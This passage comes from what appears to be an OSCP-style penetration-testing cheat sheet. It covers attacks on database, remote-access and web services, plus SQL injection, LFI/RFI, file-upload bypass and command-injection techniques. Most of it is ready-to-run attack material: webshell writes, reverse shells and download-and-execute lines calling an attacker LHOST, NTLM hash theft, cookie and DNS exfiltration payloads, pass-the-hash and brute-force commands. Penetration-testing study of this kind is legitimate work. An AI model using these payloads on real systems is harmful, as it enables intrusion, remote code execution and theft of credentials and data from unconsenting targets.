# ── SNMP-CHECK ────────────────────────────────────────────────
snmp-check $IP -c public -v 1
snmp-check $IP -c public -v 2c

# ── SNMPSET (write, if writable community) ────────────────────
snmpset -c private -v1 $IP 1.3.6.1.2.1.1.6.0 s "pwned"

# ── SNMP TO SHELL (if Net-SNMP with extend) ───────────────────
# If extend functionality enabled:
snmpwalk -c public -v2c $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull

# ── TIPS ──────────────────────────────────────────────────────
# Process args often leak: passwords, connection strings, API keys
# Windows SNMP leaks usernames, shares, services, software list
# SNMPv3 auth: snmpwalk -v3 -l authPriv -u user -a SHA -A authpass -x AES -X privpass $IP
```

</details>

<details>
<summary>🗄️ 4.11 MySQL — Port 3306</summary>

```bash
# ── CONNECT ───────────────────────────────────────────────────
mysql -h $IP -u root -p
mysql -h $IP -u root --password=''
mysql -h $IP -u root --password=root
mysql -h $IP -u '' --password=''     # Anonymous

# ── ENUMERATION ───────────────────────────────────────────────
SHOW databases;
USE mysql;
SHOW tables;
SELECT * FROM user;                  # Username + password hashes
SELECT user, host, authentication_string FROM mysql.user;
SELECT @@hostname, @@datadir, @@version, @@global.secure_file_priv;
SHOW variables LIKE 'secure_file_priv';  # Empty = can read/write anywhere!

# ── FILE READ ─────────────────────────────────────────────────
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/root/.ssh/id_rsa');
SELECT LOAD_FILE('/var/www/html/config.php');

# ── FILE WRITE → WEBSHELL ─────────────────────────────────────
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
SELECT "<?php system($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/html/shell.php';
-- Need: FILE privilege + secure_file_priv = '' + write access to path

# ── UDF PRIVILEGE ESCALATION ──────────────────────────────────
# If running as root + plugin_dir writable:
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('id > /tmp/out; chown user /tmp/out');

# ── BRUTE FORCE ───────────────────────────────────────────────
hydra -l root -P rockyou.txt $IP mysql
nmap --script mysql-brute -p3306 $IP

# ── NMAP SCRIPTS ──────────────────────────────────────────────
nmap --script mysql-info,mysql-databases,mysql-users,mysql-empty-password -p3306 $IP
```

</details>

<details>
<summary>🗄️ 4.12 MSSQL — Port 1433</summary>

```bash
# ── CONNECT ───────────────────────────────────────────────────
impacket-mssqlclient domain/user:pass@$IP
impacket-mssqlclient user:pass@$IP -windows-auth     # Windows auth
impacket-mssqlclient user:pass@$IP -port 1433

# ── ENUMERATION ───────────────────────────────────────────────
SELECT @@version;
SELECT name FROM sys.databases;
SELECT name FROM sys.tables;
SELECT name FROM master.dbo.sysdatabases;
SELECT srvname, isremote FROM sysservers;     # Linked servers!
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
EXEC xp_msver;                                # Server info

# ── XP_CMDSHELL → RCE ─────────────────────────────────────────
-- Enable (need sysadmin):
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://LHOST/shell.ps1'')"';

-- If can't enable directly:
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd /c whoami > C:\output.txt', 0, TRUE;

# ── LINKED SERVER ATTACK ──────────────────────────────────────
EXEC ('SELECT @@version') AT [linkedserver];
EXEC ('EXEC xp_cmdshell ''whoami''') AT [linkedserver];

# ── FILE READ ─────────────────────────────────────────────────
CREATE TABLE t (content NVARCHAR(4000));
BULK INSERT t FROM 'c:\windows\win.ini' WITH (ROWTERMINATOR = '\n');
SELECT * FROM t;

# ── STEAL NTLM HASH ───────────────────────────────────────────
# Start responder: responder -I tun0 -wPv
EXEC xp_dirtree '\\LHOST\share';
EXEC master.sys.xp_dirtree '\\LHOST\share';
# Or: EXEC xp_fileexist '\\LHOST\share'

# ── NMAP + CME ────────────────────────────────────────────────
nmap --script ms-sql-info,ms-sql-config,ms-sql-empty-password -p1433 $IP
crackmapexec mssql $IP -u user -p pass -q "SELECT @@version"
crackmapexec mssql $IP -u user -p pass --local-auth -q "EXEC xp_cmdshell 'whoami'"
```

</details>

<details>
<summary>🖥️ 4.13 RDP — Port 3389</summary>

```bash
# ── FINGERPRINT ───────────────────────────────────────────────
nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 $IP -p3389
nmap --script rdp-enum-encryption -p3389 $IP

# ── CONNECT ───────────────────────────────────────────────────
xfreerdp /u:user /p:pass /v:$IP
xfreerdp /u:user /p:pass /v:$IP +clipboard              # Enable clipboard
xfreerdp /u:user /p:pass /v:$IP /drive:kali,/tmp        # Mount /tmp as share
xfreerdp /u:user /p:pass /v:$IP /dynamic-resolution /cert-ignore
xfreerdp /u:Administrator /pth:NTLMHASH /v:$IP          # Pass-the-hash!
rdesktop -u user -p pass $IP -g 1280x720
rdesktop -u user -p pass $IP -r disk:share=/tmp         # Mount share

# ── PASS-THE-HASH RDP ─────────────────────────────────────────
# Requires: Restricted Admin Mode enabled on target
# Enable on target (if local admin):
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
xfreerdp /u:Administrator /pth:NTLMHASH /v:$IP

# ── CVEs ──────────────────────────────────────────────────────
# BlueKeep (CVE-2019-0708) - Pre-auth RCE - Windows 7/2008R2/2003/XP
nmap --script rdp-vuln-ms12-020 $IP
msf: use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
# DejaBlue (CVE-2019-1181/1182) - Windows 8+/2012+

# ── BRUTE FORCE ───────────────────────────────────────────────
hydra -l administrator -P rockyou.txt rdp://$IP
crowbar -b rdp -s $IP/32 -u user -C rockyou.txt

# ── SCREENSHOTTING (if RDP session alive but locked) ──────────
# If you have code exec but no interactive:
tscon 1 /dest:console   # Hijack another user's session!
# List sessions: query user OR qwinsta
```

</details>

<details>
<summary>🔧 4.14 WinRM — Ports 5985, 5986</summary>

```bash
# ── CHECK IF ACCESSIBLE ───────────────────────────────────────
nmap -p5985,5986 $IP
crackmapexec winrm $IP -u user -p pass

# ── EVIL-WINRM (best tool) ────────────────────────────────────
evil-winrm -i $IP -u user -p pass
evil-winrm -i $IP -u user -H NTLMHASH          # PtH
evil-winrm -i $IP -u user -p pass -S            # SSL (port 5986)
evil-winrm -i $IP -u user -p pass \
  -e /path/to/executables \     # Upload and exec
  -s /path/to/ps1-scripts       # Load PS1 scripts in session

# Inside evil-winrm:
# upload /local/file C:\remote\file
# download C:\remote\file /local/file
# Invoke-Binary /path/to/binary   (bypass AV)
# menu    → shows available commands

# ── SSL WINRM (5986) ──────────────────────────────────────────
evil-winrm -i $IP -u user -p pass -S -P 5986
# Or with cert:
evil-winrm -i $IP -c cert.pem -k key.pem -S
```

</details>

<details>
<summary>🔴 4.15 Redis — Port 6379</summary>

```bash
# ── UNAUTHENTICATED ACCESS ────────────────────────────────────
redis-cli -h $IP ping          # PONG = accessible
redis-cli -h $IP
> info server                   # Version + OS
> config get *                  # All config settings
> keys *                        # List all keys
> get key_name                  # Get key value
> dbsize                        # Count of keys

# ── WITH AUTH ─────────────────────────────────────────────────
redis-cli -h $IP -a password
redis-cli -h $IP
> AUTH password

# ── WEBSHELL VIA REDIS ────────────────────────────────────────
redis-cli -h $IP
> config set dir /var/www/html
> config set dbfilename shell.php
> set pwn "<?php system($_GET['cmd']); ?>"
> save
# → Access: http://$IP/shell.php?cmd=id

# ── SSH KEY VIA REDIS ─────────────────────────────────────────
ssh-keygen -t rsa -f /tmp/redis_key -N ""
(echo -e "\n\n"; cat /tmp/redis_key.pub; echo -e "\n\n") > /tmp/spaced.txt
redis-cli -h $IP flushall
redis-cli -h $IP -x set pwn < /tmp/spaced.txt
redis-cli -h $IP config set dir /root/.ssh/
redis-cli -h $IP config set dbfilename authorized_keys
redis-cli -h $IP save
ssh -i /tmp/redis_key root@$IP

# ── REDIS CRON JOB RCE ────────────────────────────────────────
redis-cli -h $IP config set dir /var/spool/cron/
redis-cli -h $IP config set dbfilename root
redis-cli -h $IP set pwn "\n\n* * * * * bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\n\n"
redis-cli -h $IP save

# ── BRUTE FORCE ───────────────────────────────────────────────
hydra -P /usr/share/wordlists/rockyou.txt redis://$IP
```

</details>

<details>
<summary>🔶 4.16 Oracle TNS — Port 1521</summary>

```bash
# ── ENUMERATION ───────────────────────────────────────────────
nmap --script oracle-tns-version,oracle-sid-brute -p1521 $IP
tnscmd10g version -h $IP
tnscmd10g status -h $IP

# ── SID BRUTE FORCE ───────────────────────────────────────────
odat sidguesser -s $IP
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 $IP oracle-sid
msf: use auxiliary/scanner/oracle/sid_brute

# ── ODAT — ORACLE DATABASE ATTACK TOOL ───────────────────────
odat all -s $IP -p 1521         # All checks
odat passwordguesser -s $IP -d SID
odat utlfile -s $IP -d SID -U user -P pass --sysdba --putFile /tmp shell.php "<?php system($_GET['cmd']); ?>"

# ── CONNECT ───────────────────────────────────────────────────
sqlplus user/pass@$IP/SID
sqlplus user/pass@$IP/SID as sysdba    # Priv connection
# Common default creds:
# sys:change_on_install | system:manager | scott:tiger | DBSNMP:DBSNMP
```

</details>

<details>
<summary>🍃 4.17 MongoDB — Port 27017</summary>

```bash
# ── CONNECT ───────────────────────────────────────────────────
mongo $IP
mongo $IP:27017
mongo $IP/admin -u user -p pass

# ── ENUMERATION ───────────────────────────────────────────────
> show dbs
> use admin
> db.getUsers()
> db.runCommand({connectionStatus:1})
> db.adminCommand({listDatabases:1})
> show collections
> db.collection.find()
> db.collection.find().pretty()

# ── NOSQL INJECTION ───────────────────────────────────────────
# In web forms that use MongoDB backend:
username[$ne]=invalid&password[$ne]=invalid   # Not-equal bypass
username=admin&password[$regex]=.*            # Regex bypass
{"username": {"$gt": ""}, "password": {"$gt": ""}}
# Mongo Injection payloads:
username=admin'%20||%20'1'=='1'&password=x
```

</details>

<details>
<summary>🖥️ 4.18 VNC — Ports 5900-5909</summary>

```bash
# ── FINGERPRINT ───────────────────────────────────────────────
nmap -sV -p5900 $IP
nmap --script vnc-info,vnc-brute -p5900 $IP

# ── CONNECT ───────────────────────────────────────────────────
vncviewer $IP
vncviewer $IP:1           # Display 1
vncviewer $IP::5901       # Explicit port

# ── BRUTE FORCE ───────────────────────────────────────────────
hydra -P rockyou.txt $IP vnc -t 1    # -t 1 important, VNC hates concurrent
medusa -h $IP -P rockyou.txt -M vnc
nmap --script vnc-brute -p5900 $IP

# ── DECRYPT SAVED VNC PASSWORD ────────────────────────────────
# Found .vnc config or registry entry
# Decrypt (uses fixed 3DES key):
python3 -c "
import base64; from Crypto.Cipher import DES3
enc = bytes.fromhex('HEXPASSWORD')
key = b'\xe8\x4a\xd6\x60\xc4\x72\x1a\xe0'
print(DES3.new(key, DES3.MODE_ECB).decrypt(enc).rstrip(b'\x00'))"
# Or use: vncpwd / vncpasswd tool
```

</details>

<details>
<summary>📞 4.19 Other Notable Services</summary>

```bash
# ── TELNET (23) ───────────────────────────────────────────────
telnet $IP 23
# Default creds: admin/admin, root/root, admin/(blank)
nmap --script telnet-brute -p23 $IP

# ── POP3 (110) ───────────────────────────────────────────────
nc -nv $IP 110
USER admin
PASS password
LIST           # List emails
RETR 1         # Read email 1

# ── IMAP (143) ────────────────────────────────────────────────
nc -nv $IP 143
a LOGIN user password
a LIST "" "*"
a SELECT INBOX
a FETCH 1 BODY[]

# ── IRC (6667) ────────────────────────────────────────────────
nmap --script irc-botnet-channels,irc-info -p6667 $IP
# UnrealIRCd backdoor (CVE-2010-2075)
nc -nv $IP 6667
AB; bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1

# ── RSYNC (873) ───────────────────────────────────────────────
rsync rsync://$IP/                    # List shares
rsync rsync://$IP/share               # List share contents
rsync rsync://$IP/share /tmp/rsync/   # Download all
rsync /tmp/shell /rsync://$IP/share/  # Upload (if writable)

# ── CUPS (631) ────────────────────────────────────────────────
# Printing service — often on Linux
curl http://$IP:631/
nmap --script cups-info -p631 $IP

# ── DOCKER API (2375, 2376) ───────────────────────────────────
curl http://$IP:2375/version
curl http://$IP:2375/containers/json
docker -H tcp://$IP:2375 ps
docker -H tcp://$IP:2375 run -v /:/mnt -it alpine chroot /mnt sh

# ── KUBERNETES API (6443, 8443, 8080) ─────────────────────────
curl https://$IP:6443/api/v1 -k
kubectl --server=https://$IP:6443 get pods --all-namespaces

# ── ELASTICSEARCH (9200) ──────────────────────────────────────
curl http://$IP:9200/
curl http://$IP:9200/_cat/indices
curl http://$IP:9200/index/_search?pretty

# ── CASSANDRA (9042) ──────────────────────────────────────────
nmap --script cassandra-info -p9042 $IP

# ── POSTGRES (5432) ───────────────────────────────────────────
psql -h $IP -U postgres
psql -h $IP -U postgres -c "\l"      # List databases
psql -h $IP -U postgres -c "SELECT pg_read_file('/etc/passwd')"
psql -h $IP -U postgres -c "COPY (SELECT '') TO PROGRAM 'id'"
# RCE via COPY TO PROGRAM:
psql -h $IP -U postgres -c "COPY (SELECT '') TO PROGRAM 'bash -c ''bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'''"

# ── KERBEROS (88) ─────────────────────────────────────────────
# See Active Directory section for full Kerb attacks
nmap --script krb5-enum-users --script-args krb5-enum-users.realm=domain.com -p88 $IP
kerbrute userenum -d domain.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc $IP
```

</details>



---

## 5. VULNERABILITY IDENTIFICATION

<details>
<summary>🔎 5.1 Searchsploit — Master Workflow</summary>

```bash
# ── BASIC SEARCH ──────────────────────────────────────────────
searchsploit apache 2.4.49
searchsploit openssh 7.2
searchsploit "windows 7" "privilege escalation"
searchsploit -t "Remote" "Buffer Overflow"    # Title search

# ── FLAGS ─────────────────────────────────────────────────────
searchsploit -x 12345          # Examine (read without copying)
searchsploit -m 12345          # Mirror (copy to current dir)
searchsploit -w 12345          # Show web URL
searchsploit --update          # Update database
searchsploit -p 12345          # Full path

# ── SEARCH FROM NMAP OUTPUT ───────────────────────────────────
searchsploit --nmap scans/nmap/targeted.xml

# ── FIX EXPLOITS (common issues) ──────────────────────────────
# Change LHOST/LPORT/RHOST in exploit:
sed -i 's/LHOST/$LHOST/g' exploit.py
# Python2 → Python3:
2to3 exploit.py -w
# Check imports, fix urllib issues:
# urllib.request, urllib.parse instead of urllib in Py3

# ── COMPILE C EXPLOITS ────────────────────────────────────────
gcc exploit.c -o exploit
gcc exploit.c -o exploit -m32                          # 32-bit
gcc exploit.c -o exploit -pthread -lcrypt              # With libs
gcc exploit.c -o exploit -lpthread                     # Pthread
# Cross-compile for Windows:
i686-w64-mingw32-gcc exploit.c -o exploit.exe          # 32-bit Windows
x86_64-w64-mingw32-gcc exploit.c -o exploit64.exe      # 64-bit Windows
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32 # With winsock

# ── EXPLOIT MODIFICATION CHECKLIST ───────────────────────────
# Before running ANY exploit:
# 1. Read the code — understand what it does
# 2. Check: does it need a listener? what port?
# 3. Update IP, port, path variables
# 4. Check Python version requirements
# 5. Check library dependencies (pip install X)
# 6. Test on local machine if possible
# 7. Note any destructive operations (rm, format, crash)
```

</details>

<details>
<summary>🎯 5.2 Metasploit — Smart Usage for OSCP</summary>

```bash
# ── SETUP ─────────────────────────────────────────────────────
msfconsole -q                          # Quiet start
msf> workspace -a $IP
msf> db_nmap -sC -sV -p$ports $IP      # Import nmap to db

# ── SEARCH ────────────────────────────────────────────────────
msf> search type:exploit platform:windows ms17-010
msf> search cve:2021-41773
msf> search name:eternalblue

# ── USE WITHOUT METERPRETER (for OSCP — use shell payloads!) ──
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set PAYLOAD windows/x64/shell_reverse_tcp   # NOT meterpreter
msf> set RHOSTS $IP
msf> set LHOST $LHOST
msf> set LPORT $LPORT
msf> run

# ── AUXILIARY MODULES (don't count toward MSF limit) ──────────
msf> use auxiliary/scanner/smb/smb_ms17_010   # Just scanning
msf> use auxiliary/scanner/ssh/ssh_enumusers
msf> use auxiliary/scanner/mssql/mssql_login

# ── TIPS ──────────────────────────────────────────────────────
# OSCP RULE: Metasploit only on 1 machine
# Use manual exploits for everything else
# Auxiliary scanners don't count toward the limit
# Document which machine you used MSF on
# If MSF fails → try manual exploit from searchsploit/exploit-db
```

</details>

---

## 6. WEB APPLICATION ATTACKS

<details>
<summary>📋 6.1 Web Pentest Methodology (Full Checklist)</summary>

```
BEFORE TOUCHING A SINGLE INPUT:
[ ] Page source (Ctrl+U) — comments, hidden fields, version info
[ ] robots.txt, sitemap.xml
[ ] Response headers (Server, X-Powered-By, Set-Cookie)
[ ] SSL cert (hostnames, org name, email)
[ ] Error pages (trigger 404/500 — reveals tech stack)
[ ] Cookies — decode base64, JWT, check HttpOnly/Secure flags
[ ] JavaScript files — may contain API keys, endpoints, logic
[ ] Browser console errors
[ ] Network tab — background API calls, hidden parameters

DIRECTORY/FILE ENUM:
[ ] gobuster/feroxbuster (medium list + extensions)
[ ] FFUF for parameters
[ ] Check ALL discovered pages (not just /admin)

AUTHENTICATION:
[ ] Try default creds
[ ] Register new account (see what you can access)
[ ] Check "forgot password" flow
[ ] Check user enumeration on login (different error for valid user)

INPUT TESTING:
[ ] Every text input → SQLi, XSS, SSTI, LDAP injection
[ ] File upload → bypass, webshell
[ ] URL parameters → LFI, RFI, path traversal, SSRF
[ ] Hidden form fields → IDOR, privilege escalation
[ ] API endpoints → auth bypass, information disclosure
```

</details>

<details>
<summary>💉 6.2 SQL Injection — Complete Arsenal</summary>

```bash
# ── DETECTION ─────────────────────────────────────────────────
'                           # Basic error trigger
''                          # Escape the escape
`                           # MySQL backtick
')                          # Close bracket
' OR '1'='1                 # Classic auth bypass
' OR '1'='1'--              # With comment
' OR '1'='1'#               # MySQL comment
' OR '1'='1'/*              # C-style comment
admin'--                    # Comment rest of query
' OR 1=1--
" OR "1"="1
1' ORDER BY 1--             # Order by to find columns
1' ORDER BY 2--
1' ORDER BY 3--             # Error when exceeds column count

# ── AUTH BYPASS ───────────────────────────────────────────────
' OR '1'='1'--
admin'--
admin' #
' OR 1=1--
') OR ('1'='1
' OR 'x'='x
1' OR '1'='1
" OR ""="

# ── UNION BASED ───────────────────────────────────────────────
# Step 1: Find column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   # Error = previous number was max

# Step 2: Find displayable columns
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--    # Find string columns

# Step 3: Extract data
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,user(),database()--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,username,password FROM users--

# Step 4: File read
' UNION SELECT NULL,load_file('/etc/passwd'),NULL--

# Step 5: Write webshell
' UNION SELECT NULL,"<?php system($_GET['cmd']); ?>",NULL INTO OUTFILE '/var/www/html/shell.php'--

# ── BLIND BOOLEAN ─────────────────────────────────────────────
' AND 1=1--       # True
' AND 1=2--       # False (page changes)
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
' AND (SELECT COUNT(*) FROM users)>0--

# ── BLIND TIME-BASED ──────────────────────────────────────────
# MySQL:
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF((SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a',SLEEP(5),0)--
# MSSQL:
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
# PostgreSQL:
'; SELECT pg_sleep(5)--

# ── MSSQL SPECIFIC ────────────────────────────────────────────
'; EXEC xp_cmdshell 'id'--
'; EXEC master.dbo.xp_cmdshell 'powershell -c "..."'--
# Stacked queries:
'; SELECT 1; SELECT 2--

# ── POSTGRESQL SPECIFIC ───────────────────────────────────────
'; COPY (SELECT '') TO PROGRAM 'id'--
'; CREATE TABLE t(c text); COPY t FROM PROGRAM 'id'--
'; DROP TABLE IF EXISTS t; CREATE TABLE t(c text); COPY t FROM PROGRAM 'curl http://LHOST/shell.sh | bash'--

# ── SQLMAP FULL WORKFLOW ──────────────────────────────────────
# Basic
sqlmap -u "http://$IP/page?id=1" --dbs --batch

# POST
sqlmap -u "http://$IP/login" --data="user=admin&pass=test" --dbs --batch

# From Burp request file (best for complex requests)
sqlmap -r request.txt --dbs --batch

# Specific DB + table
sqlmap -u "http://$IP/page?id=1" -D dbname -T users --dump --batch

# OS shell
sqlmap -u "http://$IP/page?id=1" --os-shell --batch

# Bypass WAF
sqlmap -u "http://$IP/page?id=1" --tamper=space2comment,between,randomcase --dbs

# Crawl
sqlmap -u "http://$IP/" --crawl=3 --forms --dbs --batch

# Upload file
sqlmap -u "http://$IP/page?id=1" --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php

# Authentication needed
sqlmap -u "http://$IP/page?id=1" --cookie="PHPSESSID=xxxxx" --dbs
sqlmap -u "http://$IP/page?id=1" -H "Authorization: Bearer TOKEN" --dbs

# Second order injection
sqlmap -u "http://$IP/page?id=1" --second-url="http://$IP/profile" --dbs

# ── NOSQL INJECTION ───────────────────────────────────────────
# MongoDB:
username[$ne]=x&password[$ne]=x          # GET
{"username":{"$ne":""},"password":{"$ne":""}}   # JSON
username=admin&password[$regex]=.*
username[$gt]=&password[$gt]=
# Bypass login entirely with always-true conditions
```

</details>

<details>
<summary>📂 6.3 LFI / RFI — Full Exploitation Chain</summary>

```bash
# ── BASIC LFI DETECTION ───────────────────────────────────────
?page=../../../../etc/passwd
?file=../../../etc/shadow
?lang=....//....//etc/passwd     # Filter bypass
?page=..%252f..%252f..%252fetc%252fpasswd   # Double URL encode
?page=....\/....\/....\/etc/passwd
?page=/etc/passwd%00             # Null byte (PHP < 5.5)
?page=/etc/passwd%00.jpg
?page=....//....//etc/passwd

# ── WINDOWS PATHS ─────────────────────────────────────────────
?file=../../../../windows/system32/drivers/etc/hosts
?file=../../../../windows/win.ini
?file=../../../../windows/system32/config/SAM
?file=C:/xampp/htdocs/index.php

# ── PHP WRAPPERS (CRITICAL!) ──────────────────────────────────
# Read PHP source (b64 encoded):
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/convert.base64-encode/resource=config.php
# Decode: echo "BASE64" | base64 -d

# Read with rot13:
?page=php://filter/read=string.rot13/resource=index.php

# RCE via PHP input:
?page=php://input
# POST body: <?php system($_GET['cmd']); ?>
curl -X POST "http://$IP/page?page=php://input&cmd=id" --data "<?php system(\$_GET['cmd']); ?>"

# RCE via data wrapper:
?page=data://text/plain,<?php system('id'); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# RCE via expect (if enabled):
?page=expect://id

# Zip wrapper:
?page=zip:///path/to/file.zip#shell.php

# Phar wrapper:
?page=phar:///path/to/file.phar

# ── LOG POISONING → RCE ───────────────────────────────────────
# Step 1: Inject PHP into logs via User-Agent:
curl -A "<?php system(\$_GET['cmd']); ?>" http://$IP/
# Step 2: Include the log via LFI:
curl "http://$IP/page?file=/var/log/apache2/access.log&cmd=id"
# Works on: access.log, error.log, auth.log, mail.log, vsftpd.log

# Log paths to try:
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log         # If FTP user-agent injection
/var/log/auth.log           # SSH login attempts
/var/log/mail.log
/var/log/syslog
/proc/self/environ          # HTTP_USER_AGENT in environ
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/var/mail/www-data

# Via SSH (SSH poisoning):
ssh "<?php system(\$_GET['cmd']); ?>"@$IP
curl "http://$IP/page?file=/var/log/auth.log&cmd=id"

# Via SMTP (SMTP poisoning):
telnet $IP 25
MAIL FROM: test@test.com
RCPT TO: www-data
DATA
Subject: <?php system($_GET['cmd']); ?>
.
# Then LFI: ?file=/var/mail/www-data&cmd=id

# ── /PROC FILESYSTEM ──────────────────────────────────────────
/proc/self/cmdline      # Current process command
/proc/self/environ      # Environment variables
/proc/self/fd/         # File descriptors (open files!)
# Read open file descriptors:
?page=/proc/self/fd/0   # stdin
?page=/proc/self/fd/3   # Often the web app config!
# Try 0-20:
for i in $(seq 0 20); do curl -s "http://$IP/page?file=/proc/self/fd/$i"; done

# ── LFI TO FULL RCE PATH ─────────────────────────────────────
# Option 1: Log poisoning (above)
# Option 2: PHP session file
# Session files stored at: /var/lib/php/sessions/sess_SESSIONID
# Inject PHP into session via cookie: PHPSESSID=xxx + vulnerable param
curl "http://$IP/login" -b "PHPSESSID=abc123" --data "user=<?php system(\$_GET['cmd']); ?>"
curl "http://$IP/page?file=/var/lib/php/sessions/sess_abc123&cmd=id"

# Option 3: Upload + LFI
# Upload a PHP file (even as image), include via LFI

# ── RFI ───────────────────────────────────────────────────────
# Test:
?page=http://LHOST/test.txt
?page=\\LHOST\share\test.txt    # Windows SMB RFI
# Requires: allow_url_include = On (php.ini)
# Host payload:
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
python3 -m http.server 80
# Trigger:
curl "http://$IP/page?page=http://$LHOST/shell.php&cmd=id"
```

</details>

<details>
<summary>📤 6.4 File Upload — Every Bypass Technique</summary>

```bash
# ── BASIC BYPASSES ────────────────────────────────────────────
# 1. Change extension:
shell.php → shell.php5, shell.php7, shell.phtml, shell.pHp, shell.PHP, shell.Php
shell.asp → shell.asp;.jpg, shell.asa, shell.aspx, shell.cer
shell.jsp → shell.jspx, shell.jsw, shell.jsv, shell.jspf

# 2. Double extension:
shell.jpg.php
shell.png.php

# 3. Null byte (PHP < 5.3.4):
shell.php%00.jpg
shell.php\x00.jpg

# 4. Change Content-Type in Burp:
Content-Type: image/jpeg    (while uploading shell.php)
Content-Type: image/png
Content-Type: image/gif

# 5. Magic bytes — prepend real image header:
echo -e '\xff\xd8\xff\xe0' > shell.php  # JPEG magic bytes
cat webshell.php >> shell.php
# Or:
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg.php

# 6. GIF header:
echo "GIF89a<?php system(\$_GET['cmd']); ?>" > shell.php.gif

# 7. .htaccess upload (if Apache + writable .htaccess):
# Upload .htaccess with:
AddType application/x-httpd-php .jpg
# Then upload shell.jpg → executes as PHP

# 8. web.config upload (IIS):
<?xml version="1.0" encoding="UTF-8"?>
<configuration><system.webServer><handlers accessPolicy="Read, Script, Write">
<add name="web_config" path="*.config" verb="*" modules="IsapiModule"
scriptProcessor="C:\windows\system32\inetsrv\asp.dll" resourceType="Unspecified"
requireAccess="Write" preCondition="bitness64" /></handlers>
<security><requestFiltering><fileExtensions><remove fileExtension=".config" /></fileExtensions>
<hiddenSegments><remove segment="web.config" /></hiddenSegments></requestFiltering></security></system.webServer></configuration>
<%
Dim oSO : Set oSO = Server.CreateObject("MSXML2.DOMDocument.6.0")
Dim oXML : Set oXML = Server.CreateObject("MSXML2.ServerXMLHTTP.6.0")
oXML.Open "POST","http://LHOST",False
oXML.setRequestHeader "Content-Type","text/xml; charset=utf-8"
oXML.Send("<command>" & Request.Form("cmd") & "</command>")
%>

# 9. SVG XSS + SSRF:
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('http://LHOST/?c='+document.cookie)</script>
</svg>

# ── CHECK WHERE FILE IS STORED ────────────────────────────────
# After upload, the path is often:
# /uploads/shell.php
# /files/shell.php
# /media/shell.php
# /images/shell.php
# Check response for path, or fuzz:
gobuster dir -u http://$IP -w common.txt -x php,jpg,png

# ── EXIFTOOL INJECTION ────────────────────────────────────────
exiftool -DocumentName="<?php system(\$_GET['cmd']); ?>" image.jpg
# Then if PHP is processing EXIF data via getimagesize or exif_read_data → RCE

# ── IMAGEMAGICK CVE-2016-3714 (ImageTragick) ─────────────────
# Upload .mvg or .svg file:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/x.png";|id; ")'
pop graphic-context
```

</details>

<details>
<summary>💻 6.5 Command Injection — Full Bypass Arsenal</summary>

```bash
# ── BASIC OPERATORS ───────────────────────────────────────────
; id                    # Semicolon — run after
&& id                   # AND — run if first succeeds
|| id                   # OR — run if first fails
| id                    # Pipe — chain commands
& id                    # Background — run concurrently
`id`                    # Backtick — command substitution
$(id)                   # Dollar paren — substitution
%0a id                  # Newline (URL encoded)
%0d%0a id               # CRLF

# ── SPACE BYPASS ──────────────────────────────────────────────
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
X=$'cat\x20/etc/passwd'&&$X
cat%09/etc/passwd          # Tab

# ── BLACKLIST BYPASS ──────────────────────────────────────────
# If "cat" is blacklisted:
c'a't /etc/passwd
c"a"t /etc/passwd
ca\t /etc/passwd
/bin/c?t /etc/passwd       # Wildcard
/bin/ca* /etc/passwd       # Wildcard
echo 'cat' | bash          # Via echo

# If "/" is blacklisted:
${HOME:0:1}etc${HOME:0:1}passwd
# ${HOME} = /home/user → ${HOME:0:1} = '/'

# ── BLIND COMMAND INJECTION ───────────────────────────────────
# Time-based detection:
127.0.0.1; sleep 5
127.0.0.1 && sleep 5
127.0.0.1 | sleep 5

# Out-of-band (DNS exfil):
127.0.0.1; nslookup $(whoami).LHOST
